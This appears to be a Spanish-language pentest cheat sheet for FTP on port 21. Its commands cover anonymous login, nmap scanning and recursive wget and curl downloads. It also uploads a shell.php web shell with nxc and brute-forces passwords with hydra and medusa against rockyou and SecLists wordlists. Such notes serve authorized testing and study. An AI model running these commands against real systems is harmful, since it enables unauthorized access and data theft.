---
layout: default
title: 21 - FTP
---
```bash
ftp IP

anonymous
```

```bash
nmap -p 21 --script ftp-anon -iL ips.txt -oN 21_nmap.txt --open
```

```bash
wget -r ftp://ftp.servidor.com/ruta/
```

```bash
wget -r --ftp-user=usuario --ftp-password=clave ftp://ftp.servidor.com/ruta/
```

Subir archivo
```
put <file>
```

Si no se puede así:
```bash
nxc ftp IP -u admin -p admin --put /mnt/Windows/Hacking/tools/shell.php shell.php
```

Quitar modo pasivo

```
229 Entering Extended Passive Mode (|||49163|)

^C
receive aborted. Waiting for remote to finish abort.
ftp> passive
Passive mode: off; fallback to active mode: off.
```

# Si no se puede descargar, poner en modo bin

```
bin
```

A veces no funciona desde el cliente, se puede con wget o curl:

```
wget --no-passive-ftp ftp://anonymous:@IP/Backups/backup.mdb
```

```bash
curl -O ftp://anonymous:@IP/Backups/backup.mdb
```

# Bruteforce

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 32 IP ftp
```

```bash
medusa -u admin -P /usr/share/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -h IP -M ftp -f -t 32 | grep SUCCESS
```

```bash
hydra -I -V -f -L usernames.txt -u -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt IP ftp
```

